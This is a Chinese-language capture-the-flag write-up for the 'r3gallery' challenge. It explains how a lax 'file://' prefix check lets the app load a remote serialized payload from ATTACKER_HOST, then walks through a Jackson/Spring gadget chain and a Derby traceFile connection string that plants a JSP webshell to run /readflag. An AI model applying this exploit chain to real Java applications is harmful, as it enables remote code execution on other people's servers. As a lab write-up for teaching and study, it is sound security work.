# r3gallery

## 题目简述

应用部署在 Tomcat 9，`gallery.war` 中的 `/gallery/api/decompress?path=` 会读取一份 GZIP 文件并直接使用 `ObjectInputStream.readObject()`。反编译后的关键逻辑为：

```java
String p = PathUtils.canonicalPath("file:///heavy_images/" + path);
if (p == null || !p.startsWith("file://")) {
    return "Invalid".getBytes();
}
FileUrlResource r = new FileUrlResource(new URL(p));
InputStream gz = new GZIPInputStream(r.getInputStream());
ObjectInputStream ois = new ObjectInputStream(gz);
ImageBean image = (ImageBean) ois.readObject();
```

路径校验只要求 `file://` 前缀，允许把 URI authority 改成攻击者主机，从远端加载任意序列化对象。类路径中还包含可序列化的 `CustomDataSource` 和 Apache Derby JDBC 驱动，可通过反序列化 gadget 触发 JDBC 连接，并用 Derby trace 文件写出 JSP。

## 解题过程

### 控制反序列化输入

基础 URI 是 `file:///heavy_images/`。令参数为：

```text
../../ATTACKER_HOST:PORT/exploit.bin
```

规范化后会形成仍以 `file://` 开头、但 authority 已变为攻击者主机的 URI。题目环境的 Java URL/FileUrlResource 会从该远端位置读取内容。公开复现使用 FTP 服务托管文件；无论具体传输实现如何，必须验证最终 URL 确实由目标容器取回。

`exploit.bin` 不是普通 Java 序列化流，而是：

```text
GZIP(ObjectOutputStream(gadget object))
```

这样才能依次通过 `GZIPInputStream` 和 `ObjectInputStream`。

### 准备 Derby 任意文件写

应用启动时主动注册 `org.apache.derby.jdbc.ClientDriver`。自定义类 `CustomDataSource` 的 `getConnection()` 会把可控字段 `conStr` 交给 `DriverManager.getConnection()`。

Derby 客户端连接串支持 `traceFile` 与 `traceLevel`。即使本地 8080 没有 Derby 服务，客户端仍会先创建 trace 文件并写入连接信息。连接串可设为：

```text
jdbc:derby://127.0.0.1:8080/tmp/myderby;
create=true;
traceFile=<TOMCAT>/webapps/gallery/exploit.jsp;
traceLevel=35;
<% JSP_CODE %>=zz
```

`JSP_CODE` 读取并输出 `/readflag` 的标准输出。连接属性以分号分隔，因此 JSP 内的分号需要用 `\u003b` 等方式编码，避免提前截断属性。`traceLevel` 取约 32 至 35 可以减少妨碍 JSP 解析的日志内容。

### 组装 getter gadget

`CustomDataSource` 没有自己的 `readObject()`，需要从 JDK 集合反序列化一路调用到它的 getter。可用链为：

```text
HashMap.readObject
  -> HotSwappableTargetSource.equals
  -> XString.equals
  -> POJONode.toString
  -> JDK 动态 AOP 代理的 getter
  -> CustomDataSource.getConnection
```

构造要点如下：

1. 创建 `CustomDataSource`，反射设置 `conStr` 为 Derby/JSP 连接串；
2. 用 Spring `AdvisedSupport` 把它包装成实现 `PendingDataSource` 的 `JdkDynamicAopProxy`；
3. 将代理放入 Jackson `POJONode`；
4. 用 Javassist 在本地移除 `BaseJsonNode.writeReplace()`，否则序列化时对象会被替换，链无法保持；
5. 把 `POJONode` 与 `XString("1")` 分别包入两个 `HotSwappableTargetSource`；
6. 反射填充 `HashMap.table`，避免构造阶段提前触发 `equals()`；
7. 将最终 HashMap 经 `ObjectOutputStream` 写入 `GZIPOutputStream`。

托管 `exploit.bin` 后访问：

```text
/gallery/api/decompress?path=../../ATTACKER_HOST:PORT/exploit.bin
```

反序列化最终触发 Derby 连接。连接失败并不影响 trace JSP 已经落盘。随后访问 `/gallery/exploit.jsp`，脚本执行 `/readflag` 并回显 flag。

完整的 Java gadget 构造与题目依赖版本见 [R3CTF r3gallery Writeup](https://blig.one/2024/06/28/r3ctf-r3gallery-writeup.html)。本文已保留远端 `file:` URI、双层压缩/序列化格式、完整调用链、`writeReplace` 处理以及 Derby trace 写文件参数。

## 方法总结

本题需要同时验证三个边界：路径规范化是否改变 URI authority、反序列化依赖中是否存在可达 getter、JDBC 驱动是否能在连接失败前产生文件副作用。`startsWith("file://")` 不是可靠的本地文件限制；Java 反序列化的危险也不限于现成 `readObject` gadget，只要能从集合比较、字符串化和 Bean getter 串到有副作用的方法，就能形成利用链。最终 RCE 来自 Derby 客户端的 trace 写文件，而不是成功连接数据库。
